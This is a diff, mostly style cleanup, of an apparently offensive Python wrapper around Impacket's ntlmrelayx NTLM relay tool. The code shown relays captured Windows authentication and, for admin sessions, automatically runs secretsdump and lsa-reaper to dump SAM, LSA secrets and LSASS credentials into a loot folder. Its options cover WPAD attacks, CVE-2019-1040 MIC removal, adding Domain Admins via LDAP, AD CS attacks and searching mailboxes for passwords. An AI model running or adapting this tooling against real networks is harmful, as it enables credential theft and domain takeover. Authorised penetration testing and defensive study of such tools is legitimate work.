@@ -38,6 +38,7 @@ import argparse
 import sys, os
 import logging
 import cmd
+
 try:
     from urllib.request import ProxyHandler, build_opener, Request
 except ImportError:
@@ -69,6 +70,7 @@ red_exclm = "{}[!]{}".format(color_RED, color_reset)
 cwd = os.path.abspath(os.path.dirname(__file__))
 RELAY_SERVERS = []
 dumped_ips = []
+
 
 class MiniShell(cmd.Cmd):
     def __init__(self, relayConfig, threads, local_ip):
@@ -108,7 +110,7 @@ class MiniShell(cmd.Cmd):
 
     def do_finished_attacks(self, line):
         for url in self.relayConfig.target.finishedAttacks:
-            print (url.geturl())
+            print(url.geturl())
         return
 
     def do_socks(self, line):
@@ -134,7 +136,7 @@ class MiniShell(cmd.Cmd):
                 tmp = tmp.replace('"', '')
                 tmp = tmp.replace('\n', '')
                 tmp = tmp.split('],')
-                
+
                 # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
 
                 if os.path.isdir(cwd + "/loot") == False:
@@ -144,18 +146,18 @@ class MiniShell(cmd.Cmd):
                     dat = item.replace(']', '').split(',')
                     if dat[3] == 'TRUE':
                         if dat[1] not in dumped_ips:
-                            dumped_ips.append(dat[1]) # append the ip to dumped_ips to avoid dumping the same host twice
+                            dumped_ips.append(dat[1])  # append the ip to dumped_ips to avoid dumping the same host twice
                             os.system('sudo mkdir {}/loot/{}'.format(cwd, dat[1]))
-                            #lsa secrets and sam dump courtesy of secretsdump
+                            # lsa secrets and sam dump courtesy of secretsdump
                             try:
                                 os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}/{}\''.format(dat[2], dat[1], cwd, dat[1], dat[1]))
                             except Exception as e:
                                 print(str(e))
                                 print('Error dumping secrets')
 
-                            #lsass dump with reaper
+                            # lsass dump with reaper
 
-                            #step 1 stopservers
+                            # step 1 stopservers
                             if self.serversRunning:
                                 stop_servers(self.relayThreads)
                                 self.serversRunning = False
@@ -163,16 +165,14 @@ class MiniShell(cmd.Cmd):
                             else:
                                 logging.error('Relay servers are already stopped!')
 
-
-                            #step 2 start reaper
+                            # step 2 start reaper
                             try:
                                 os.system('sudo python3 lsa-reaper.py {}@{} -oe -ip {} -ap -no-pass'.format(dat[2], dat[1], local_ip))
                             except Exception as e:
                                 print(str(e))
                                 Print('Error Dumping lsass')
 
-
-                            #step 3 start servers
+                            # step 3 start servers
                             if not self.serversRunning:
                                 start_servers(options, self.relayThreads)
                                 self.serversRunning = True
@@ -206,9 +206,10 @@ class MiniShell(cmd.Cmd):
     def do_EOF(self, line):
         return self.do_exit(line)
 
+
 def start_servers(options, threads):
     for server in RELAY_SERVERS:
-        #Set up config
+        # Set up config
         c = NTLMRelayxConfig()
         c.setProtocolClients(PROTOCOL_CLIENTS)
         c.setRunSocks(options.socks, socksServer)
@@ -242,12 +243,12 @@ def start_servers(options, threads):
 
         c.setAltName(options.altname)
 
-        #If the redirect option is set, configure the HTTP server to redirect targets to SMB
+        # If the redirect option is set, configure the HTTP server to redirect targets to SMB
         if server is HTTPRelayServer and options.r is not None:
             c.setMode('REDIRECT')
             c.setRedirectHost(options.r)
 
-        #Use target randomization if configured and the server is not SMB
+        # Use target randomization if configured and the server is not SMB
         if server is not SMBRelayServer and options.random:
             c.setRandomTargets(True)
 
@@ -273,6 +274,7 @@ def start_servers(options, threads):
         threads.add(s)
     return c
 
+
 def stop_servers(threads):
     todelete = []
     for thread in threads:
@@ -283,6 +285,7 @@ def stop_servers(threads):
     for thread in todelete:
         threads.remove(thread)
         del thread
+
 
 def config_check():
     fail = 0
@@ -311,11 +314,11 @@ def config_check():
         fail += 1
 
     if fail == 2:
-        print('{} ERROR you are missing proxychains configs'.format(red_minus))
+        print('{} ERROR you are missing proxychains config'.format(red_minus))
         sys.exit(1)
 
-    if sockfail == 2:
-        print('{} ERROR you are missing "socks4  127.0.0.1 1080" in your proxychains configs'.format(red_minus))
+    if sockfail >= 1:
+        print('{} ERROR you are missing "socks4  127.0.0.1 1080" in your proxychains config'.format(red_minus))
         sys.exit(1)
 
 
@@ -336,31 +339,31 @@ if __name__ == '__main__':
     config_check()
 
     print(version.BANNER)
-    #Parse arguments
-    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
-                                    "try to relay that connection to specified target(s) system or the original client")
+    # Parse arguments
+    parser = argparse.ArgumentParser(add_help=False, description="For every connection received, this module will "
+                                                                 "try to relay that connection to specified target(s) system or the original client")
     parser._optionals.title = "Main options"
 
-    #Main arguments
-    parser.add_argument("-h","--help", action="help", help='show this help message and exit')
+    # Main arguments
+    parser.add_argument("-h", "--help", action="help", help='show this help message and exit')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-localip', action='store', help='Your local ip or network interface for the remote device to connect to')
-    parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help="Target to relay the credentials to, "
-                                  "can be an IP, hostname or URL like domain\\username@host:port (domain\\username and port "
-                                  "are optional, and don't forget to escape the '\\'). If unspecified, it will relay back "
-                                  "to the client')")
-    parser.add_argument('-tf', action='store', metavar = 'TARGETSFILE', help='File that contains targets by hostname or '
-                                                                             'full URL, one per line')
+    parser.add_argument('-t', "--target", action='store', metavar='TARGET', help="Target to relay the credentials to, "
+                                                                                 "can be an IP, hostname or URL like domain\\username@host:port (domain\\username and port "
+                                                                                 "are optional, and don't forget to escape the '\\'). If unspecified, it will relay back "
+                                                                                 "to the client')")
+    parser.add_argument('-tf', action='store', metavar='TARGETSFILE', help='File that contains targets by hostname or '
+                                                                           'full URL, one per line')
     parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                         'automatically (only valid with -tf)')
-    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient, LDAP console or SQL shell instead'
-                        'of executing a command after a successful relay. This console will listen locally on a '
-                        ' tcp port and can be reached with for example netcat.')
+    parser.add_argument('-i', '--interactive', action='store_true', help='Launch an smbclient, LDAP console or SQL shell instead'
+                                                                         'of executing a command after a successful relay. This console will listen locally on a '
+                                                                         ' tcp port and can be reached with for example netcat.')
 
     # Interface address specification
-    parser.add_argument('-ip','--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
-                  'bind SMB and HTTP servers',default='')
+    parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
+                                                                                              'bind SMB and HTTP servers', default='')
 
     serversoptions = parser.add_argument_group()
     serversoptions.add_argument('--no-smb-server', action='store_true', help='Disables the SMB server')
@@ -374,12 +377,12 @@ if __name__ == '__main__':
     parser.add_argument('--raw-port', type=int, help='Port to listen on raw server', default=6666)
 
     parser.add_argument('--no-multirelay', action="store_true", required=False, help='If set, disable multi-host relay (SMB and HTTP servers)')
-    parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection')
-    parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
-    parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
-                    'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
-    parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes '
-                                                                   'will be added for ntlm and ntlmv2')
+    parser.add_argument('-ra', '--random', action='store_true', help='Randomize target selection')
+    parser.add_argument('-r', action='store', metavar='SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
+    parser.add_argument('-l', '--lootdir', action='store', type=str, required=False, metavar='LOOTDIR', default='.', help='Loot '
+                                                                                                                          'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
+    parser.add_argument('-of', '--output-file', action='store', help='base output filename for encrypted hashes. Suffixes '
+                                                                     'will be added for ntlm and ntlmv2')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                        '"%s"). If errors are detected, run chcp.com at the target, '
                                                        'map the result with '
@@ -390,50 +393,50 @@ if __name__ == '__main__':
                                                                              'SMB Server (16 hex bytes long. eg: 1122334455667788)')
     parser.add_argument('-socks', action='store_true', default=False,
                         help='Launch a SOCKS proxy for the connection relayed')
-    parser.add_argument('-wh','--wpad-host', action='store',help='Enable serving a WPAD file for Proxy Authentication attack, '
+    parser.add_argument('-wh', '--wpad-host', action='store', help='Enable serving a WPAD file for Proxy Authentication attack, '
                                                                    'setting the proxy host to the one supplied.')
-    parser.add_argument('-wa','--wpad-auth-num', action='store', type=int, default=1, help='Prompt for authentication N times for clients without MS16-077 installed '
-                                                                   'before serving a WPAD file. (default=1)')
-    parser.add_argument('-6','--ipv6', action='store_true',help='Listen on both IPv6 and IPv4')
-    parser.add_argument('--remove-mic', action='store_true',help='Remove MIC (exploit CVE-2019-1040)')
-    parser.add_argument('--serve-image', action='store',help='local path of the image that will we returned to clients')
-    parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
-                        'target system (for SMB and RPC). If not specified for SMB, hashes will be dumped (secretsdump.py must be'
-                        ' in the same directory). For RPC no output will be provided.')
+    parser.add_argument('-wa', '--wpad-auth-num', action='store', type=int, default=1, help='Prompt for authentication N times for clients without MS16-077 installed '
+                                                                                            'before serving a WPAD file. (default=1)')
+    parser.add_argument('-6', '--ipv6', action='store_true', help='Listen on both IPv6 and IPv4')
+    parser.add_argument('--remove-mic', action='store_true', help='Remove MIC (exploit CVE-2019-1040)')
+    parser.add_argument('--serve-image', action='store', help='local path of the image that will we returned to clients')
+    parser.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND', help='Command to execute on '
+                                                                                                'target system (for SMB and RPC). If not specified for SMB, hashes will be dumped (secretsdump.py must be'
+                                                                                                ' in the same directory). For RPC no output will be provided.')
 
-    #SMB arguments
+    # SMB arguments
     smboptions = parser.add_argument_group("SMB client options")
 
-    smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
-                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+    smboptions.add_argument('-e', action='store', required=False, metavar='FILE', help='File to execute on the target system. '
+                                                                                       'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')
 
-    #RPC arguments
+    # RPC arguments
     rpcoptions = parser.add_argument_group("RPC client options")
     rpcoptions.add_argument('-rpc-mode', choices=["TSCH"], default="TSCH", help='Protocol to attack, only TSCH supported')
     rpcoptions.add_argument('-rpc-use-smb', action='store_true', required=False, help='Relay DCE/RPC to SMB pipes')
     rpcoptions.add_argument('-auth-smb', action='store', required=False, default='', metavar='[domain/]username[:password]',
-        help='Use this credential to authenticate to SMB (low-privilege account)')
+                            help='Use this credential to authenticate to SMB (low-privilege account)')
     rpcoptions.add_argument('-hashes-smb', action='store', required=False, metavar="LMHASH:NTHASH")
     rpcoptions.add_argument('-rpc-smb-port', type=int, choices=[139, 445], default=445, help='Destination port to connect to SMB')
 
-    #MSSQL arguments
+    # MSSQL arguments
     mssqloptions = parser.add_argument_group("MSSQL client options")
-    mssqloptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
-                        '(can specify multiple)')
+    mssqloptions.add_argument('-q', '--query', action='append', required=False, metavar='QUERY', help='MSSQL query to execute'
+                                                                                                      '(can specify multiple)')
 
-    #HTTPS options
+    # HTTPS options
     httpoptions = parser.add_argument_group("HTTP options")
     httpoptions.add_argument('-machine-account', action='store', required=False,
-                            help='Domain machine account to use when interacting with the domain to grab a session key for '
-                                 'signing, format is domain/machine_name')
+                             help='Domain machine account to use when interacting with the domain to grab a session key for '
+                                  'signing, format is domain/machine_name')
     httpoptions.add_argument('-machine-hashes', action="store", metavar="LMHASH:NTHASH",
-                            help='Domain machine hashes, format is LMHASH:NTHASH')
+                             help='Domain machine hashes, format is LMHASH:NTHASH')
     httpoptions.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
     httpoptions.add_argument('-remove-target', action='store_true', default=False,
-                            help='Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)')
+                             help='Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)')
 
-    #LDAP options
+    # LDAP options
     ldapoptions = parser.add_argument_group("LDAP client options")
     ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information')
     ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin')
@@ -448,15 +451,15 @@ if __name__ == '__main__':
     ldapoptions.add_argument('--dump-adcs', action='store_true', required=False, help='Attempt to dump ADCS enrollment services and certificate templates info')
     ldapoptions.add_argument('--add-dns-record', nargs=2, action='store', metavar=('NAME', 'IPADDR'), required=False, help='Add the <NAME> record to DNS via LDAP pointing to <IPADDR>')
 
-    #IMAP options
+    # IMAP options
     imapoptions = parser.add_argument_group("IMAP client options")
-    imapoptions.add_argument('-k','--keyword', action='store', metavar="KEYWORD", required=False, default="password", help='IMAP keyword to search for. '
-                        'If not specified, will search for mails containing "password"')
-    imapoptions.add_argument('-m','--mailbox', action='store', metavar="MAILBOX", required=False, default="INBOX", help='Mailbox name to dump. Default: INBOX')
-    imapoptions.add_argument('-a','--all', action='store_true', required=False, help='Instead of searching for keywords, '
-                        'dump all emails')
-    imapoptions.add_argument('-im','--imap-max', action='store',type=int, required=False,default=0, help='Max number of emails to dump '
-        '(0 = unlimited, default: no limit)')
+    imapoptions.add_argument('-k', '--keyword', action='store', metavar="KEYWORD", required=False, default="password", help='IMAP keyword to search for. '
+                                                                                                                            'If not specified, will search for mails containing "password"')
+    imapoptions.add_argument('-m', '--mailbox', action='store', metavar="MAILBOX", required=False, default="INBOX", help='Mailbox name to dump. Default: INBOX')
+    imapoptions.add_argument('-a', '--all', action='store_true', required=False, help='Instead of searching for keywords, '
+                                                                                      'dump all emails')
+    imapoptions.add_argument('-im', '--imap-max', action='store', type=int, required=False, default=0, help='Max number of emails to dump '
+                                                                                                            '(0 = unlimited, default: no limit)')
 
     # AD CS options
     adcsoptions = parser.add_argument_group("AD CS attack options")
@@ -476,14 +479,14 @@ if __name__ == '__main__':
     shadowcredentials.add_argument('--cert-outfile-path', action='store', required=False, help='filename to store the generated self-signed PEM or PFX certificate and key')
 
     try:
-       options = parser.parse_args()
+        options = parser.parse_args()
     except Exception as e:
-       logging.error(str(e))
-       sys.exit(1)
+        logging.error(str(e))
+        sys.exit(1)
 
     if options.rpc_use_smb and not options.auth_smb:
-       logging.error("Set -auth-smb to relay DCE/RPC to SMB pipes")
-       sys.exit(1)
+        logging.error("Set -auth-smb to relay DCE/RPC to SMB pipes")
+        sys.exit(1)
 
     # Init the example's logger theme
     logger.init(options.ts)
@@ -547,7 +550,7 @@ if __name__ == '__main__':
             options.no_multirelay = True
     else:
         if options.tf is not None:
-            #Targetfile specified
+            # Targetfile specified
             logging.info("Running in relay mode to hosts in targetfile")
             targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS, randomize=options.random)
             mode = 'RELAY'
